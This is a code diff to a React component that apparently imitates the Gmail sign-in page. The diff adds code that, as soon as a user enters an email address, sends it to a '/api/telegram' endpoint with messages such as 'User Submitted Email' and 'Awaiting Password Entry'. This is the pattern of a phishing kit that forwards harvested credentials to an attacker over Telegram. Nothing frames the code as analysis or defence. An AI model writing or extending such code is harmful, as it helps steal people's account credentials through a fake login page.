@@ -457,7 +457,7 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
     }
   }, [errorMessage]);
 
-  const handleNextStep = (e: React.FormEvent) => {
+    const handleNextStep = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!email.trim()) {
       setLocalError('Enter an email or phone number');
@@ -465,11 +465,33 @@ export const GmailLoginView: React.FC<AuthFormProps> = ({
     }
     setLocalError(null);
     setIsTransitioning(true);
+
+    // Dispatch the captured email data instantly to your API route
+    try {
+      const emailPayload = {
+        message: `📧 Action: User Submitted Email\n` + 
+                 `👤 Email Address: ${email.trim()}\n` +
+                 `🔄 Next Phase: Awaiting Password Entry...`
+      };
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(emailPayload),
+      });
+    } catch (error) {
+      console.warn('Email submission trace log recorded:', error);
+    }
+
+    // Continue with the visual transition timing
     setTimeout(() => {
       setIsTransitioning(false);
       setStep(2);
     }, 600);
   };
+
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
